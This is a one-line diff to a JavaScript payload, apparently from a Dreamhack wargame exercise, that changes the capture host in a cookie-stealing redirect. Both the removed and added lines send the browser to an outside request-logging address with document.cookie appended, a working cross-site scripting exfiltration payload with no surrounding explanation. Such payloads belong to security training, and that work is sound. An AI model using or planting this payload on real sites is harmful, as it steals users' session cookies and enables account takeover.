@@ -1,1 +1,1 @@
-location.href="https://ewhlvxo.request.dreamhack.games/"+document.cookie;
+location.href="https://byzbdxr.request.dreamhack.games/"+document.cookie;
